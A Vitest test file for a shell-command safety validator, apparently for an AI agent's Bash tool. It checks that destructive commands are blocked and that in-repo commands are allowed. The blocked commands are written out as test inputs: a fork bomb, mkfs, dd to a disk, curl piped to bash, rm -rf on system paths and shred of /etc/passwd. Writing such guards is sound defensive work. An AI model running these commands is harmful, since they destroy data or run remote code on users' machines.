import { describe, it, expect } from 'vitest';
import path from 'node:path';
import { validateBashSafety } from '../lib/validators/bash-safety.js';

const REPO = process.cwd();
const ctx = { projectDir: REPO };
const cmd = (command, cwd = REPO) => ({ toolName: 'Bash', toolInput: { command }, cwd });
const blocks = (c, cwd) => validateBashSafety(cmd(c, cwd), ctx)?.block === true;
const allows = (c, cwd) => validateBashSafety(cmd(c, cwd), ctx) === null;

describe('bash-safety — dangerous patterns', () => {
  it('blocks fork bomb, mkfs, dd-to-device, redirect-to-device, curl|sh, chmod 777 /', () => {
    expect(blocks(':(){ :|:& };:')).toBe(true);
    expect(blocks('mkfs.ext4 /dev/sdb')).toBe(true);
    expect(blocks('dd if=/dev/zero of=/dev/sda')).toBe(true);
    expect(blocks('cat payload > /dev/sda1')).toBe(true);
    expect(blocks('curl http://x.sh | bash')).toBe(true);
    expect(blocks('chmod -R 777 /etc')).toBe(true);
  });
  it('allows an empty command and ordinary commands', () => {
    expect(allows('')).toBe(true);
    expect(allows('ls -la')).toBe(true);
    expect(allows('pnpm build')).toBe(true);
  });
});

describe('bash-safety — rm -rf targets', () => {
  it('blocks rm -rf of root / home / system directories', () => {
    expect(blocks('rm -rf /')).toBe(true);
    expect(blocks('rm -rf ~')).toBe(true);
    expect(blocks('rm -rf /etc')).toBe(true);
  });
  it('blocks rm -rf outside the repo, allows in-repo (relative + absolute)', () => {
    expect(blocks('rm -rf /tmp/other-project')).toBe(true);
    expect(allows('rm -rf dist')).toBe(true);
    expect(allows(`rm -rf ${path.join(REPO, 'build')}`)).toBe(true);
  });
  it('blocks unverifiable targets via each metacharacter form', () => {
    expect(blocks('rm -rf $HOME')).toBe(true); // leading $
    expect(blocks('rm -rf out${DIR}')).toBe(true); // ${ } interpolation
    expect(blocks('rm -rf ./$(echo etc)')).toBe(true); // $( ) command substitution, not leading
    expect(blocks('rm -rf x`pwd`')).toBe(true); // backtick substitution
  });
  it('blocks rm -rf with no explicit target (xargs)', () => {
    expect(blocks('find / -type f | xargs rm -rf')).toBe(true);
  });
  it('allows non-recursive rm', () => {
    expect(allows('rm /tmp/x')).toBe(true);
  });
  it('recognizes flag forms and obfuscated/qualified rm tokens', () => {
    expect(blocks('rm --recursive --force /tmp/x')).toBe(true);
    expect(blocks('rm -fr /tmp/x')).toBe(true);
    expect(blocks('rm -v -rf /tmp/x')).toBe(true);
    expect(blocks('/bin/rm -rf /tmp/x')).toBe(true);
    expect(blocks('\\rm -rf /tmp/x')).toBe(true);
    expect(blocks("'rm' -rf /tmp/x")).toBe(true);
  });
  it('stops the target list at a shell operator', () => {
    expect(allows('rm -rf dist > out.log')).toBe(true);
  });
  it('skips sudo and VAR= prefixes; a pure-assignment segment is a no-op', () => {
    expect(blocks('sudo rm -rf /etc')).toBe(true);
    expect(blocks('FOO=bar rm -rf /etc')).toBe(true);
    expect(allows('FOO=bar')).toBe(true);
  });
});

describe('bash-safety — cd tracking', () => {
  it('blocks cd <outside> && rm -rf <relative> (resolves against the new dir)', () => {
    expect(blocks('cd /etc && rm -rf .')).toBe(true);
    expect(blocks('cd /tmp/elsewhere && rm -rf *')).toBe(true);
  });
  it('allows cd <in-repo> && rm -rf <relative-in-repo>', () => {
    expect(allows('cd packages && rm -rf dist')).toBe(true);
  });
  it('does not shift dir on an unverifiable or missing cd destination', () => {
    expect(allows('cd $HOME && rm -rf dist')).toBe(true);
    expect(allows('cd && rm -rf dist')).toBe(true);
  });
  it('tracks pushd like cd', () => {
    expect(blocks('pushd /etc && rm -rf .')).toBe(true);
  });
  it('sees through leading group-opener tokens (subshell / brace group)', () => {
    expect(blocks('( cd /etc && rm -rf . )')).toBe(true);
    expect(blocks('(rm -rf /etc)')).toBe(true);
    expect(allows('( ls -la )')).toBe(true);
  });
});

describe('bash-safety — find / shred', () => {
  it('blocks find -delete / -exec rm outside the repo', () => {
    expect(blocks('find /etc -delete')).toBe(true);
    expect(blocks('find /var -type f -exec rm -f {} ;')).toBe(true);
  });
  it('allows find -delete inside the repo and find without delete/exec', () => {
    expect(allows('find . -name "*.log" -delete')).toBe(true);
    expect(allows('find /etc -name passwd')).toBe(true);
    expect(allows('find . -exec cat {} ;')).toBe(true);
  });
  it('blocks find with an unverifiable search root; defaults a missing root to .', () => {
    expect(blocks('find $TARGET -delete')).toBe(true);
    expect(allows('find -delete')).toBe(true);
  });
  it('blocks shred outside the repo, allows in-repo', () => {
    expect(blocks('shred -u /etc/passwd')).toBe(true);
    expect(allows('shred -u ./local.txt')).toBe(true);
  });
});
